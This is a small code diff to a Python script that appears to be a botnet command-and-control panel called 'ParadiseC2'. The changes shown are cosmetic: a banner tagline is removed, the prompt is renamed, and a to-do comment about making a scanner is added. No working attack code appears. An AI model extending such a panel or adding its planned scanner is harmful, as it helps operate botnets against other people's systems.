@@ -21,6 +21,9 @@
 # - New look!          #
 ########################
 
+# Checklist
+#make a scanner
+
 # Libraries
 import socket, threading, sys, time, ipaddress
 from colorama import Fore, init
@@ -50,7 +53,6 @@ banner = """
 \x1b[0;38;2;0;213;170m        |  '--' |' ,-.  ||  .--'' ,-.  |' .-. |,--.(  .-' | .-. : 
 \x1b[0;38;2;0;192;191m        |  | --' \ '-'  ||  |   \ '-'  |\ `-' ||  |.-'  `)\   --. 
 \x1b[0;38;2;0;171;212m        `--'      `--`--'`--'    `--`--' `---' `--'`----'  `----'
-\x1b[0;38;2;0;150;233m                  🌴 Slapping these mfs is paradise 🌴
 """
 
 about = """
@@ -181,7 +183,7 @@ def command_line(client):
     for x in banner.split('\n'):
         send(client, x)
 
-    prompt = f'\x1b[0m[\x1b[32m~\x1b[0m] \x1b[0;38;2;0;128;255mParadiseC2 \x1b[0m$ '
+    prompt = f'\x1b[0m[\x1b[32m~\x1b[0m] \x1b[0;38;2;0;128;255mParadise \x1b[0m$ '
     send(client, prompt, False)
 
     while 1:
